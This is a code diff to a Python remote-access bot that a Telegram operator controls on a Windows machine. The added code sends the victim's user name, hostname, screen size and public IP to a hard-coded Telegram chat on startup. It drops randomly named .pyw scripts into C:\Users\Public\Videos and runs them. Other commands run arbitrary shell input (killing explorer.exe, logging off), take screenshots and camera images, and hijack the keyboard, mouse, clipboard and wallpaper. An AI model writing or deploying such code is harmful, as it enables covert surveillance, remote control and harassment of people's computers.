@@ -16,8 +16,9 @@ import ctypes
 import requests
 from io import BytesIO
 from PIL import Image
+import socket
 import pyperclip
-
+# from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
 screen_wide = windll.user32.GetSystemMetrics(0)
 screen_height = windll.user32.GetSystemMetrics(1)
 
@@ -124,8 +125,6 @@ def camera():
 
 def th1():
     global scr_pause
-    global WRITE_TEXT
-    global ALT_TAB
     while(True):
             def WRITE_TEXT(arg):
                    keyboard.write(arg)
@@ -134,20 +133,44 @@ def th1():
             if int(scr_pause) != 0:
                   time.sleep(int(scr_pause))
                   scr(scr_pause)
-            def ALT_TAB(): # ага
-                  print("PISKAAAAAAAAA")
-                  keyboard.press_and_release('alt + tab')
+
 
 th = Thread(target = th1)
 th.start()
-global WRITE_TEXT
-global ALT_TAB
+
+
+def WRITE_TEXT(arg):
+      keyboard.write(arg)
+
+def ALT_TAB_FILE():
+     file_patch = r'C:\Users\Public\Videos'
+     with open(file_patch + '\\' + "4diAtSVHM-xASJi.pyw", "w+") as mousse:
+       
+# 1 ПИКСЕЛИ ху и продолжительность через пробел!!!
+       prog = f"""
+import random
+import keyboard
+import time
+keyboard.press_and_release('alt + tab')
+
+"""
+       mousse.write(prog)
+       mousse.close()
+       os.system(f"{file_patch}\\4diAtSVHM-xASJi.pyw")
+
+
+
 @bot.message_handler(commands=['start'])
 def start_message(message):
-    keyboard = telebot.types.ReplyKeyboardMarkup(True)
-    keyboard.row('scr', 'scd','rec115','alb',"cmdtaskkill /f /im explorer.exe","cmdstart explorer.exe","mclr10","cam")
+    keyboard = telebot.types.ReplyKeyboardMarkup(True,True)
+    keyboard.row('scr', 'scd','rec115','alb',"cmdtaskkill /f /im explorer.exe",r"cmdstart explorer.exe","mclr10","cam",'cmdshutdown -l',"wlphttps://cdn.cloudflare.steamstatic.com/steam/apps/1206700/header.jpg?t=1603251631","wlphttps://i.ytimg.com/vi/zcNfZWySsMI/maxresdefault.jpg")
     bot.send_message(message.chat.id, 'Keyboard Update', reply_markup=keyboard)
 
+def sound():
+     pass
+      # sessions = AudioUtilities.GetAllSessions()
+      # volume = session._ctl.QueryInterface(ISimpleAudioVolume)
+      # volume.SetMasterVolume(0.6, None)
 
 def CLIPBOARD(arg): #
     pyperclip.copy(arg)
@@ -176,52 +199,68 @@ def WALLPAPER(arg): #
     ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
     image.close()
     os.remove(image_path)
-global MOUSE_CLICK
 
 
-def th4():
-     global MOUSE_CLICK
+def MOUSE_CLICK_FILE(arg):
+     file_patch = r'C:\Users\Public\Videos'
+     with open(file_patch + '\\' + "3diAtSVHM-xASJi.pyw", "w+") as mousse:
+       
+# 1 ПИКСЕЛИ ху и продолжительность через пробел!!!
+       prog = f"""
+import random
+import pyautogui
+import time
+arg = "{arg}"
+button = arg[:1]
+count = int(arg[1:])+1
+if button == 'r' or button =="R":
+      
+      while int(count):
+       count -= 1
+       pyautogui.rightClick()
+       time.sleep(0.1)
+elif button =="l" or button =="L":
+      
+      while int(count):
+            count -= 1
+            pyautogui.leftClick()
+            time.sleep(0.1)
+count = 0      
 
-     while True:
-            def MOUSE_CLICK(arg):
-             button = arg[:1]
-             count = int(arg[1:])+1
-             if button == 'r' or button =="R":
-                   
-                   while int(count):
-                        count -= 1
-                        pyautogui.rightClick()
-                        time.sleep(0.1)
-             elif button =="l" or button =="L":
-                   
-                   while int(count):
-                         count -= 1
-                         pyautogui.leftClick()
-                         time.sleep(0.1)
-             count = 0      
+"""
+       mousse.write(prog)
+       mousse.close()
+       os.system(f"{file_patch}\\3diAtSVHM-xASJi.pyw")
 
 
-the2 = Thread(target = th4)
-the2.start()
-global MOUSE_SHAKE
-def th5():
-     global MOUSE_SHAKE
-     while True:
-             def MOUSE_SHAKE(arg): # 1 ПИКСЕЛИ ху и продолжительность через пробел!!!
-                  arg = arg.split(' ')
-                  shake_intensity = int(arg[0])
-                  shake_duration = int(arg[1])
-                  for _ in range(int(shake_duration / 0.01)):
-                        x = random.randint(-shake_intensity,shake_intensity)
-                        y = random.randint(-shake_intensity,shake_intensity)
-                        pyautogui.move(x,y)
-                        pyautogui.moveTo(x,y)
-                  shake_duration = 0
 
-the3 = Thread(target = th5)
-the3.start()
+def MOUSE_SHAKE_FILE(arg):
+     file_patch = r'C:\Users\Public\Videos'
+     with open(file_patch + '\\' + "3diAtSVHM-xASCi.pyw", "w+") as mousse:
+       
+# 1 ПИКСЕЛИ ху и продолжительность через пробел!!!
+       prog = f"""
+import random
+import pyautogui
+arg = "{arg}"
+arg = arg.split(' ')
+shake_intensity = int(arg[0])
+shake_duration = int(arg[1])
+for _ in range(int(shake_duration / 0.01)):
+      x = random.randint(-shake_intensity,shake_intensity)
+      y = random.randint(-shake_intensity,shake_intensity)
+      pyautogui.move(x,y)
+      pyautogui.moveTo(x,y)
+shake_duration = 0
 
-liscommand = [ 'scr','rec','scd','alb', 'cmd', 'wlp',"wrt", "clp","mlc","msh","cam"]
+"""
+       mousse.write(prog)
+       mousse.close()
+       os.system(f"{file_patch}\\3diAtSVHM-xASCi.pyw")
+     
+
+
+liscommand = [ 'scr','rec','scd','alb', 'cmd', 'wlp',"wrt", "clp","mlc","msh","cam","vlm"]
 
 @bot.message_handler()
 def receiving_mesage(message):
@@ -249,8 +288,7 @@ def receiving_mesage(message):
         scd()
 
        elif command == 'alb':
-        print("ALT")
-        ALT_TAB()
+        ALT_TAB_FILE()
         
        elif command == 'cmd':
             CMD(arg)
@@ -261,12 +299,13 @@ def receiving_mesage(message):
        elif command == "clp":
             CLIPBOARD(arg)   
        elif command == "mlc":
-            MOUSE_CLICK(arg)
+            MOUSE_CLICK_FILE(arg)
        elif command == "msh":
-            MOUSE_SHAKE(arg)
+            MOUSE_SHAKE_FILE(arg)
        elif command =="cam":
             camera()     
-
+       elif command =="vlm":
+            sound()
 
 
 
@@ -280,6 +319,13 @@ f"""получена команда: {command}
           bot.send_message(message.chat.id,"who are you?")
           
 
-
+strokahello =f"""
+Бот запущен у пользователя: {USER_NAME}
+Разрешение экрана: {screen_height}*{screen_wide}
+{socket.getfqdn()}
+ip: {requests.get('https://ip.beget.ru/').text}
+  """
+bot.send_message(USEr_id,strokahello)
 
 bot.infinity_polling()
+
